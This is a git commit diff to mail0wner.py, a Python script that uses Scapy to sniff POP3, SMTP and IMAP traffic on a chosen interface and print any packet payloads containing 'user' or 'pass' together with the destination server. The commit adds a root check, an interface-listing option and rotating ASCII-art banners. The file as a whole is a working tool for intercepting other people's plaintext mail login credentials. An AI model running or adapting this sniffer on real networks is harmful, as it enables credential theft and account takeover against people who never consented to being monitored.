b776df64e5081218d6f1f547fd538b79a9629b6c
thecarterb <cbawsome77@gmail.com>
2016-11-15 15:32:35 -0500

    various updates

--- mail0wner.py
+++ mail0wner.py
@@ -1,10 +1,14 @@
 # -*- coding: utf-8 -*-
+import os
+import sys
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 logging.info("finished")
 logging.captureWarnings(True)
 from scapy.all import *
 import time
+import random
+import netifaces
 from optparse import OptionParser
 #supress annoying scapy warnings
 import requests.packages.urllib3
@@ -14,8 +18,12 @@ requests.packages.urllib3.disable_warnings()
 parser = OptionParser(usage="usage: sudo %prog [options]")
 parser.add_option("-t", "--time", action="store", dest="time", default=100, type=int, help="Total time to sniff packets.")
 parser.add_option("-i", "--interface", action="store", dest="iface", default="wlan0", help="Interface to use. Default: wlan0.")
+parser.add_option("--list-interfaces", action="store_true", dest="list", default=False, help="List usable interfaces and exit.")
 (options, args) = parser.parse_args()
 
+iface = options.iface
+timeout = options.time
+lstInt = options.list
 OK_GREEN = "\033[92m"
 OK_BLUE = "\033[94m"
 ERR = "\033[91m"
@@ -31,40 +39,94 @@ def printErr(s):
 
 def banner():
     banner = """
-███╗   ███╗ █████╗ ██╗██╗      ██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗ 
+███╗   ███╗ █████╗ ██╗██╗      ██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗
 ████╗ ████║██╔══██╗██║██║     ██╔═████╗██║    ██║████╗  ██║██╔════╝██╔══██╗
 ██╔████╔██║███████║██║██║     ██║██╔██║██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
 ██║╚██╔╝██║██╔══██║██║██║     ████╔╝██║██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
 ██║ ╚═╝ ██║██║  ██║██║███████╗╚██████╔╝╚███╔███╔╝██║ ╚████║███████╗██║  ██║
 ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
 By: Carter Brainerd <https://github.com/thecarterb/>
-\n\n
+\n
 """
     print(banner)
-                                                                           
-          
-    
-#packet callback
+
+def banner2():
+    banner2x = """
+           _ _ ___
+ _____ ___|_| |   |_ _ _ ___ ___ ___
+|     | .'| | | | | | | |   | -_|  _|
+|_|_|_|__,|_|_|___|_____|_|_|___|_|
+By: Carter Brainerd <https://github.com/thecarterb/>
+    """
+    print(banner2x)
+
+def banner3():
+    banner3x = """
+                                      ,dPYb,
+                                      IP'`Yb
+                                 gg   I8  8I
+                                 \"\"   I8  8'
+  ,ggg,,ggg,,ggg,     ,gggg,gg   gg   I8 dP  gg    gg    gg   ,ggg,,ggg,    ,ggg,    ,gggggg,
+ ,8\" \"8P\" \"8P\" \"8,   dP\"  \"Y8I   88   I8dP   I8    I8    88bg,8\" \"8P\" \"8,  i8\" \"8i   dP\"\"\"\"8I
+ I8   8I   8I   8I  i8'    ,8I   88   I8P    I8    I8    8I  I8   8I   8I  I8, ,8I  ,8'    8I
+,dP   8I   8I   Yb,,d8,   ,d8b,_,88,_,d8b,_ ,d8,  ,d8,  ,8I ,dP   8I   Yb, `YbadP\' ,dP     Y8,
+8P'   8I   8I   `Y8P"Y8888P"`Y88P""Y88P'"Y88P""Y88P""Y88P"  8P'   8I   `Y8888P"Y8888P      `Y8
+
+ By: Carter Brainerd <https://github.com/thecarterb/>
+"""
+    print(banner3x)
+
+def get_random_banner():
+    bannernum = random.randrange(0,3)
+    if bannernum == 0:
+        banner()
+    elif bannernum == 1:
+        banner2()
+    elif bannernum == 2:
+        banner3()
+    else:
+        banner()
+#packet callback for scapy
 def packet_callback(packet):
     if packet[TCP].payload:
         mail_packet = str(packet[TCP].payload)
         if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
             printGood("Server: %s" % packet[IP].dst)
             printGood("%s" % packet[TCP].payload)
-banner()
-try:
-    #start sniffer
-    printMsg("Starting Sniffer")
-    printMsg("Running for %i seconds..." % options.time)
+
+def sniffer(): # main function that starts sniffer
     try:
-        sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0, timeout=options.time, iface=options.iface)
-        #port 110 = POP3
-        #port 143 = IMAP
-        #port 25  = SMTP
-    except socket.error as se:
-        printErr("Couldn't start scanner. Try running as root")
-    printMsg("Scanner has finished after %i seconds." % options.time)
-    exit(0)
-except OSError as e: #catch unknown interface OSError
-    printErr("Unknown interface: %s. (use the -i switch to specify an interface or run as sudo)" % options.iface)
-    exit(1)
+        #start sniffer
+        printMsg("Starting Sniffer")
+        time.sleep(1)
+        printMsg("Running for %i seconds..." % options.time)
+        try:
+            sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0, timeout=timeout, iface=iface)
+            #port 110 = POP3
+            #port 143 = IMAP
+            #port 25  = SMTP
+        except socket.error as se:
+            printErr("Couldn't start sniffer. Try running as root")
+        printMsg("Sniffer has finished after %i seconds." % options.time)
+        exit(0)
+    except OSError as e: #catch unknown interface OSError
+        printErr("Unknown interface: %s. (use the -i switch to specify an interface)" % options.iface)
+        exit(1)
+def main():
+    if not os.geteuid() == 0:
+        printErr("Script must be run as root. Exiting...")
+        exit(-1)
+    else:
+        if lstInt == True:
+            banner2()
+            printMsg("Getting interface information...")
+            time.sleep(1)
+            ifaces = netifaces.interfaces()
+            printGood("Available interfaces are: ")
+            print ifaces
+            exit(0)
+        else:
+            get_random_banner()
+            sniffer() # call sniffer function
+if __name__ == '__main__':
+    main()
